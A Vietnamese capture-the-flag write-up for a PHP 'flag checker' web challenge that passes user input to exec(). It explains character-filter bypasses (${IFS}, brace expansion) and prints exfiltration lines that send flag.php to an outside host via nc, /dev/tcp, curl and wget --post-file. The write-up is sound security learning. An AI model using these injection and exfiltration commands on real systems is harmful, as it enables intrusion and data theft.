# Problem
```sh
This new service checks if your flags are valid. What could possibly go wrong?

Target: http://challs.xmas.htsp.ro:3001/
Author: yakuhito
```
# Solution

- Đầu tiên, sau khi kết nối đến địa chỉ đề cho, chúng ta có thể thấy được ngay source code của file [index.php](problem/index.php).
<img src=assets/p1.png>

- Sau khi đọc code, ta có thể thấy ngay yêu cầu của challenge này như sau:
	- Nhận 1 tham số có tên là `flag` thông qua phương thức `GET`.
	- Sau đó sẽ vào hàm **checkFlag** để kiểm tra chuỗi của chúng ta nhập vào, nếu có bất kì 1 kí tự nào trong chuỗi của chúng ta nhập vào không thuộc chuỗi này (cả lowercase và uppercase) **'FAKE-X-MAS{d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789}'** thì hàm **checkFlag** sẽ trả về `False` và kết thúc chương trình.
	- Nếu chuỗi của chúng ta nhập làm cho hàm **checkFlag** trả về `True` thì chúng ta sẽ đến được hàm **getFlag**. Ở hàm này, chúng ta được phép thực thi lệnh thông qua hàm **exec()** của `php`, cụ thể là `"wget -q -O - https://kuhi.to/flag/" . $flag` với biến `$flag` chính là chuỗi chúng ta nhập vào sau khi đã được kiểm tra ở hàm **checkFlag**.

- Tiếp theo chúng ta sẽ phân tích bài toán:
	- Đầu tiên để có thể dễ dàng debug (custom lại file source) hoặc build lại chương trình này để test (trường hợp sau khi server của challenge đã đóng) thì có thể sử dụng file [index.php](problem/index.php) đề cho và dùng chương trình `php` để chạy chương trình cục bộ:
<img src=assets/p4.png>
	- Nhìn vào source code, chúng ta sẽ nhanh chóng nhận ra `flag` nằm trong file `flag.php`, cùng thư mục với file `index.php`.
	- Dựa theo `output`của chương trình, chúng ta hoàn toàn không lấy được `flag`, cụ thể ở hàm **getFlag** chúng ta chỉ nhận được `Nope` hoặc `Maybe`. Cho nên hướng giải quyết sẽ là đẩy `flag` ra ngoài internet thông qua hàm **exec()**. Đến đây sẽ có 3 hướng giải quyết cho challenge này.

- Hướng 1: **Command Injection**
	- Như chúng ta có thể thấy biến `$command = "wget -q -O - https://kuhi.to/flag/" . $flag` hoàn toàn có thể cho phép chúng ta thực hiện `command injection`, cụ thể là `command1;command2|command3` với `command1` là chương trình `wget` đề cho, `command2` dùng để đọc nội dung file flag, `command3` dùng để chuyển output của `command2` ra ngoài internet. Đại loại mô hình chung sẽ là **wget -q -O - https://kuhi.to/flag/ ; cat flag.php | nc 9.9.9.9 9999** với `9.9.9.9` và `9999` là địa chỉ ip và port của chúng ta ở ngoài internet. Đến đây chúng ta sẽ cùng giải quyết 1 số vấn đề:
	- Đọc file: để đọc được file flag.php chúng ta có thể dùng `cat` (ngoài ra có thể dùng: `tac, head, tail, sort, nl, cut, awk, sed, base64...` sở dĩ có chú thích này vì có cũng có 1 bài tương tự nhưng bài đó họ xóa hết tất cả các chương trình dùng để đọc file nên chúng ta phải tùy cơ ứng biến thôi). Tuy nhiên ở hàm **checkFlag** lại không cho phép chúng ta nhập kí tự `space`, nhưng không sao, đối với `shell injection` thì cái này bypass cũng dễ. 
```sh
cat${IFS}flag.php
cat<flag.php
{cat,flag.php}
```
	- Ở đây vì hàm **checkFlag** chỉ cho phép nhập 7 kí tự đặc biệt này `-{_\$.}`
nên giải pháp sẽ là thay kí tự `space` bằng `${IFS}`.
	- Tiếp theo đến đoạn kết nối ra internet thì chúng ta có thể dùng `nc 9.9.9.9 9999`, tuy nhiên kí tự `|` lại không cho được phép. Sau 1 hồi search google thì phát hiện cách này: **cat flag > /dev/tcp/9.9.9.9/9999**, trong đó kí tự ">" sẽ được thay bằng biến môi trường `${PS2}`, kí tự `/` tuy không được phép nhưng có thể thay bằng `${HOME}` (hoặc **${HOME:0:1}**), tuy nhiên cách này cũng fail vì kí tự `>` từ biến môi trường `${PS2}` được xem như là 1 file chứ không phải là kí tự `redirect`. Đến đây chúng ta fail ở việc kết nối 2 command lại với nhau. Vậy thử dụng 1 command kiểu như là:
```sh
curl 9.9.9.9/`cat flag.php`
wget 9.9.9.9/$(base64 flag.php)
```
	- Nhưng cũng đều fail nốt vì 2 kí tự "(" và "\`" đều bị filter hết. Thật ra với cách này mình fail ngay từ đầu vì nghĩ rằng kí tự `\n` có thể làm kí tự phân cách giữa `command1` và `command2`. Nói chúng bị hàm **checkFlag** lọc kí tự như thế thì đúng là khó thở thật. 

- Hướng 2: Bypass hàm **checkFlag**
	- Đầu tiên dễ nhìn thấy nhất, là hàm `php strlen`, liệu có cách nào để hàm này trả về giá trị nhỏ hơn giá trị thực để nó không kiểm tra được hết các kí tự chúng ta nhập vào không? Đến đây chợt nghĩ đến kí tự **\x00** và **overflow integer** nhưng sau 1 hồi test đều fail :TT 
	- Tiếp tục trong hàm **checkFlag** còn hàm nào thì tìm lỗ hổng của hàm đấy thôi. Tiếp đến là hàm `strpos`, thèn này cũng có 1 bug cho phép bypass việc lọc kí tự nhưng đòi hỏi phải có kí tự `%`, mà kí tự này cũng lại bị chặn :TT
	- Cứ thế tương tự cho các hàm tiếp theo mà search tiếp nhưng chẳng thu được kết quả gì :TT 

- Hướng 3: Tận dụng **wget** đề cho
```sh
$command = "wget -q -O - https://kuhi.to/flag/" . $flag;
$cmd_output = array();
exec($command, $cmd_output);
```
	- Nhìn nhận thật kĩ thì `wget` chính là command mà chúng ta cần tìm. Đối với mô hình chung thì việc chèn `command injection` luôn là lựa chọn hàng đầu, tuy nhiên đối với bài đặc biệt như challenge này, `wget` không chỉ giúp chúng ta kết nối ra ngoài internet, mà còn có thể upload được file nên cái chúng ta làm không phải là chèn thêm `command` mà là chèn thèn `option`. Cụ thể sẽ là **wget -q -O - https://kuhi.to/flag/ 9.9.9.9 --post-file flag.php**
	- Và đây là payload và kết quả:
<img src=assets/p2.png>

<img src=assets/p3.png>

P/S: Nói chung qua challenge này được ôn lại `command injection` cũng nhiều, chỉ là vì không liên quan nên không nói cụ thể trong bài này nên đành để lại 1 số reference tại đây vậy :xD

[Shell Command Language](https://pubs.opengroup.org/onlinepubs/009604499/utilities/xcu_chap02.html)

[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)

[Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


